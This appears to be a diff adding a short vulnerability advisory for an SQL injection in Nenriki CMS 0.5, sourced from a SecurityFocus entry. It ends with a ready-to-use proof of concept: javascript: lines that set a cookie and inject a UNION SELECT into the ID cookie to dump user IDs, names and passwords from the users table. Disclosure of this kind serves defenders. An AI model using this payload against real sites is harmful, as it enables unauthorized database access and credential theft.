@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/34067/info
+
+Nenriki CMS is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Nenriki CMS 0.5 is vulnerable; other versions may also be affected. 
+
+javascript:document.cookie ="password=1; path=/" then
+javascript:document.cookie ="ID=' union select 0,0,0,concat(id,name,char(58),password),0,0 from users--; path=/" 
